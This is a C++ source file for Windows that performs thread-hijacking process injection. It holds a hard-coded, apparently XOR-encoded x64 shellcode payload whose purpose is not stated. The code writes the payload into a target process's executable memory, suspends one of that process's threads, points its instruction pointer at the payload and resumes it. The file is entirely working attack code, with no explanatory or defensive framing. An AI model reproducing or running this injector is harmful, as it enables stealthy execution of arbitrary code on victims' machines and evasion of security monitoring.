#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include<winnt.h>
int main()
{
	unsigned char shellcode[] =
		"\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef\xff"
		"\xff\xff\x48\xbb\x95\x43\xe9\x8b\x43\xac\xce\x5b\x48\x31\x58"
		"\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x69\x0b\x6a\x6f\xb3\x44"
		"\x0e\x5b\x95\x43\xa8\xda\x02\xfc\x9c\x0a\xc3\x0b\xd8\x59\x26"
		"\xe4\x45\x09\xf5\x0b\x62\xd9\x5b\xe4\x45\x09\xb5\x0b\x62\xf9"
		"\x13\xe4\xc1\xec\xdf\x09\xa4\xba\x8a\xe4\xff\x9b\x39\x7f\x88"
		"\xf7\x41\x80\xee\x1a\x54\x8a\xe4\xca\x42\x6d\x2c\xb6\xc7\x02"
		"\xb8\xc3\xc8\xfe\xee\xd0\xd7\x7f\xa1\x8a\x93\x27\x4e\xd3\x95"
		"\x43\xe9\xc3\xc6\x6c\xba\x3c\xdd\x42\x39\xdb\xc8\xe4\xd6\x1f"
		"\x1e\x03\xc9\xc2\x42\x7c\x2d\x0d\xdd\xbc\x20\xca\xc8\x98\x46"
		"\x13\x94\x95\xa4\xba\x8a\xe4\xff\x9b\x39\x02\x28\x42\x4e\xed"
		"\xcf\x9a\xad\xa3\x9c\x7a\x0f\xaf\x82\x7f\x9d\x06\xd0\x5a\x36"
		"\x74\x96\x1f\x1e\x03\xcd\xc2\x42\x7c\xa8\x1a\x1e\x4f\xa1\xcf"
		"\xc8\xec\xd2\x12\x94\x93\xa8\x00\x47\x24\x86\x5a\x45\x02\xb1"
		"\xca\x1b\xf2\x97\x01\xd4\x1b\xa8\xd2\x02\xf6\x86\xd8\x79\x63"
		"\xa8\xd9\xbc\x4c\x96\x1a\xcc\x19\xa1\x00\x51\x45\x99\xa4\x6a"
		"\xbc\xb4\xc2\xfd\xdb\xbd\x69\xca\x70\xdb\x8b\x43\xed\x98\x12"
		"\x1c\xa5\xa1\x0a\xaf\x0c\xcf\x5b\x95\x0a\x60\x6e\x0a\x10\xcc"
		"\x5b\x94\xf8\x29\x23\x4d\x2c\x8f\x0f\xdc\xca\x0d\xc7\xca\x5d"
		"\x8f\xe1\xd9\x34\xcf\x8c\xbc\x79\x82\xd2\x7f\x2b\xe8\x8a\x43"
		"\xac\x97\x1a\x2f\x6a\x69\xe0\x43\x53\x1b\x0b\xc5\x0e\xd8\x42"
		"\x0e\x9d\x0e\x13\x6a\x83\xa1\x02\x81\xe4\x31\x9b\xdd\xca\x28"
		"\xca\xf9\x46\xc1\x84\x75\xbc\x3c\xc3\xca\x6b\xa4\x4b\xd4\x1b"
		"\xa5\x02\xa1\xe4\x47\xa2\xd4\xf9\x70\x2e\x37\xcd\x31\x8e\xdd"
		"\xc2\x2d\xcb\x41\xac\xce\x12\x2d\x20\x84\xef\x43\xac\xce\x5b"
		"\x95\x02\xb9\xca\x13\xe4\x47\xb9\xc2\x14\xbe\xc6\x72\x6c\xa4"
		"\x56\xcc\x02\xb9\x69\xbf\xca\x09\x1f\xb1\x17\xe8\x8a\x0b\x21"
		"\x8a\x7f\x8d\x85\xe9\xe3\x0b\x25\x28\x0d\xc5\x02\xb9\xca\x13"
		"\xed\x9e\x12\x6a\x83\xa8\xdb\x0a\x53\x06\x16\x1c\x82\xa5\x02"
		"\x82\xed\x74\x22\x59\x7c\x6f\x74\x96\xe4\xff\x89\xdd\xbc\x23"
		"\x00\x4d\xed\x74\x53\x12\x5e\x89\x74\x96\x17\x3e\xee\x37\x15"
		"\xa8\x31\xe5\x39\x73\xc6\x6a\x96\xa1\x08\x87\x84\xf2\x5d\xe9"
		"\x49\x69\x70\xa3\xd9\xcb\xe0\xd2\x50\x9b\xe4\x29\xac\x97\x1a"
		"\x1c\x99\x16\x5e\x43\xac\xce\x5b";

	HANDLE targetProcessHandle;
	PVOID remoteBuffer;
	HANDLE threadHijacked = NULL;
	HANDLE snapshot;
	THREADENTRY32 threadEntry;
	CONTEXT context;

	//change process ID here
	DWORD targetPID = 13688;
	context.ContextFlags = CONTEXT_FULL;
	threadEntry.dwSize = sizeof(THREADENTRY32);

	targetProcessHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
	remoteBuffer = VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);

	snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
	Thread32First(snapshot, &threadEntry);

	while (Thread32Next(snapshot, &threadEntry))
	{
		if (threadEntry.th32OwnerProcessID == targetPID)
		{
			threadHijacked = OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);
			break;
		}
	}

	SuspendThread(threadHijacked);

	GetThreadContext(threadHijacked, &context);
	context.Rip = (DWORD_PTR)remoteBuffer;
	SetThreadContext(threadHijacked, &context);

	ResumeThread(threadHijacked);
}